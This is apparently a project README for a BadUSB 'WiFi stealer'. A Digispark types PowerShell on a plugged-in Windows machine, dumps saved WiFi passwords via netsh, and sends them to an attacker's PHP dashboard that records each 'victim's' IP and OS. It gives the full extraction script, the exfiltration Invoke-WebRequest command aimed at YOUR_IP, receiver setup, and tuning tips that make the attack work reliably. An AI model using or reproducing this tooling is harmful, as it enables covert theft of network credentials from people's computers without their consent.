# WiFi Stealer Dashboard

A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard.

![Dashboard Preview](WEB_SERVER_PICTURE.png)

## What it does

- Attiny85/Digispark acts as a keyboard when plugged into Windows.
- Runs PowerShell to extract saved WiFi passwords.
- Sends everything to a PHP server on Kali or Windows.
- Shows the captured data in a simple dashboard.

---

## Setting Up the Server

You can host the dashboard on either Kali or Windows. Pick whichever you’re more comfortable with.

### On Kali Linux

```bash
# Clone the repo
cd ~
git clone https://github.com/Zypher17/wifi-stealer.git
cd wifi-stealer

# Install web server packages
sudo apt update
sudo apt install apache2 php

# Start Apache
sudo systemctl enable apache2
sudo systemctl start apache2

# Check your IP address
ip addr show | grep "inet " | grep -v 127.0.0.1

# Copy files to the web root
sudo cp index.php /var/www/html/
sudo cp wifi-recv.php /var/www/html/

# Create the log file and set permissions
sudo touch /var/www/html/wifi_creds.log
sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.log}
sudo chmod 664 /var/www/html/wifi_creds.log
```

Make sure it works:

```bash
curl -X POST http://localhost/wifi-recv.php -d "data=test"
cat /var/www/html/wifi_creds.log
```

If you see `data=test` in the output, the server is working.[web:6]

Open:

```text
http://YOUR_IP/index.php
```

Replace `YOUR_IP` with the IP address of your Kali machine.

---

### On Windows (XAMPP)

1. Download XAMPP from [apachefriends.org](https://www.apachefriends.org).
2. Install it with Apache and PHP selected.
3. Start Apache from the XAMPP control panel.

4. Get the project files:

```powershell
git clone https://github.com/Zypher17/wifi-stealer.git
# Or download the ZIP from GitHub if you don’t have git
```

5. Copy the PHP files to the web folder:

```powershell
Copy-Item index.php C:\xampp\htdocs\
Copy-Item wifi-recv.php C:\xampp\htdocs\
```

6. Create the log file:

```powershell
New-Item C:\xampp\htdocs\wifi_creds.log -ItemType File
icacls C:\xampp\htdocs\wifi_creds.log /grant Users:F
```

7. Find your IP:

```powershell
ipconfig
```

Look for the IPv4 address on your active adapter.

Test it:

```powershell
Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data=test"
Get-Content C:\xampp\htdocs\wifi_creds.log
```

Open:

```text
http://localhost/index.php
```

---

## Programming the Digispark

![Attiny85 Digispark](attiny85-digispark.jpg)

### Getting Arduino IDE ready

1. Open Arduino IDE.
2. Go to `File → Preferences`.
3. Add this to **Additional Boards Manager URLs**:

```text
http://digistump.com/package_digistump_index.json
```

4. Go to `Tools → Board → Boards Manager`.
5. Search for `Digistump AVR` and install it.
6. Select `Digispark (Default - 16.5MHz)`.

### Uploading the payload

1. Open:

```text
payloads/wifi_stealer_digispark.ino
```

2. Find this line and change the IP address:

```cpp
DigiKeyboard.print(
  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
);
```

Change `YOUR_IP` to the IP of your Kali or Windows server.

3. Click **Upload**.
4. When Arduino IDE says `Plug in device now...`, plug in the Digispark.
5. Wait for the upload to finish.

After flashing, plugging the Digispark into a Windows machine will:

- Open PowerShell.
- Read saved WiFi profiles.
- Send the captured data to your PHP receiver.
- Close out when finished.
- Blink the onboard LED to signal it’s done.

---

## Viewing the Results

All captured data is saved in:

```text
wifi_creds.log
```

The dashboard is available at:

```text
http://YOUR_IP/index.php
```

The dashboard shows:

- Total number of captures.
- SSIDs and passwords.
- Victim IP address.
- OS information.
- A delete option for entries.

---

## Removing the Project

If you want to remove everything, delete the files you copied earlier.

### On Kali Linux

```bash
sudo rm -f /var/www/html/index.php
sudo rm -f /var/www/html/wifi-recv.php
sudo rm -f /var/www/html/wifi_creds.log
```

If you want to remove the whole repository too:

```bash
rm -rf ~/wifi-stealer
```

### On Windows (XAMPP)

Delete these files from `C:\xampp\htdocs\`:

```text
index.php
wifi-recv.php
wifi_creds.log
```

If you cloned the repo, you can also delete the project folder you downloaded.

---

## Troubleshooting

### Dashboard loads, but no data appears

Most of the time the server is fine and the issue is on the Windows / payload side.

**1. Check the receiver and log file**

- Test the PHP receiver from the server itself:

  ```bash
  curl -X POST http://localhost/wifi-recv.php -d "data=test"
  cat /var/www/html/wifi_creds.log
  ```

  If you see `data=test` in the log, the PHP script and permissions are OK.[web:6]

- If nothing is written:
  - Make sure Apache is running:  
    `sudo systemctl status apache2`
  - Check the log file exists and is writable:  
    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.[web:65]

---

### PowerShell error: “Unable to connect to the remote server”

This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`, not that the PowerShell logic is broken.[web:59][web:61]

On the Windows machine, in PowerShell:

```powershell
# 1) Can we reach the server IP?
ping YOUR_IP

# 2) Is the HTTP port open?
Test-NetConnection YOUR_IP -Port 80
# or, if you really configured Apache on a custom port:
Test-NetConnection YOUR_IP -Port 8080
```

- If `ping` fails or `TcpTestSucceeded : False`, either:
  - Windows and the server are not on the same network, or
  - A firewall is blocking the connection.[web:64][web:67]

Also double‑check the URL:

- Default Apache from this README uses:  
  `http://YOUR_IP/wifi-recv.php`
- Only use `:8080` if you configured Apache to listen on 8080 and tested it in a browser first.

If manual tests work, make sure the **same URL** is used in your `.ino`:

```cpp
DigiKeyboard.print(
  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
);
```

Reflash the Digispark after any IP/URL change.

---

### PowerShell error: “You cannot call a method on a null-valued expression”

This usually comes from the WiFi profile parsing line when a regex doesn’t match some `netsh` output lines, so `.Matches[...]` is `$null` and `.Value.Trim()` crashes.[web:80][web:75]

A fragile version looks like:

```powershell
$profiles = netsh wlan show profiles |
  Select-String "All User Profile\s+:\s+(.+)" |
  %{ $_.Matches.Value.Trim() }[1]
```

To avoid this, the project uses a safer approach that doesn’t depend on complex regex groups:

```powershell
$profiles = (netsh wlan show profiles) |
  Select-String "All User Profile" |
  ForEach-Object {
    $_.Line.Split(':').Trim()[1]
  }
```

This just finds lines containing `All User Profile`, splits on `:`, and trims the right side (the SSID).[web:76][web:15]

If you ever hit the null‑valued expression error:

1. Run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine:

   ```powershell
   $csvPath = "$env:TEMP\temp.csv"
   $ip  = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
   $os  = (Get-CimInstance Win32_OperatingSystem).Caption

   $profiles = (netsh wlan show profiles) |
     Select-String "All User Profile" |
     ForEach-Object { $_.Line.Split(':').Trim() }[1]

   $wifi = foreach($p in $profiles) {
     $dump = netsh wlan show profile name="$p" key=clear
     $pass = $dump |
       Select-String "Key Content" |
       ForEach-Object { $_.Line.Split(':').Trim() }[1]

     [PSCustomObject]@{
       SSID = $p
       Pass = $pass
       IP   = $ip
       OS   = $os
     }
   }

   $wifi | Export-Csv $csvPath -NoTypeInformation
   type $csvPath
   ```

2. Once this works and the CSV looks correct, mirror those **exact** commands into the Digispark sketch as separate `DigiKeyboard.print(...)` lines with small delays between them.

---

### CSV looks good on Windows, but dashboard is still empty

If `type %TEMP%\temp.csv` (or `type $csvPath`) on Windows shows valid data, but nothing appears in the dashboard:

- Manually POST the CSV from PowerShell:

  ```powershell
  $b = Get-Content $csvPath -Raw
  Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b
  ```

- On the server, watch the log in real time:

  ```bash
  sudo tail -f /var/www/html/wifi_creds.log
  ```

If this manual POST writes to the log, the PHP side is fine. Then the issue is:

- Wrong IP/URL hard‑coded in the `.ino`, or
- HID keystrokes being dropped because the Digispark is typing too fast.[web:84][web:85]

**Keystroke / timing tips:**

- Add longer delays after heavy commands:
  - 1500–4000 ms after the `netsh`/WiFi loop and `Export-Csv`
  - 1500–2000 ms after `Invoke-WebRequest`
- Avoid one huge PowerShell line. Split it into multiple lines (like in this project), each sent by `DigiKeyboard.print(...)` + ENTER. This is much more reliable with Digispark HID.[web:37][web:72]

---

### Digispark upload fails or acts weird

- Plug the Digispark in **only after** you click **Upload** in Arduino IDE.
- Try a different USB port or a short USB extension cable.
- Confirm `Digispark (Default – 16.5 MHz)` is selected under **Tools → Board**.
- Common compile issues:
  - Make sure there is only one `.ino` in the sketch folder (Arduino compiles all `.ino` files together).
  - Ensure `#include "DigiKeyboard.h"` is at the top of the file and not inside any string or comment.[web:69][web:37]

---

## Notes

Ideas to improve it:

- Better logging and timestamps.
- CSV export / import features.
- Duplicate SSID filtering and history view.
- Authentication and HTTPS for the dashboard.
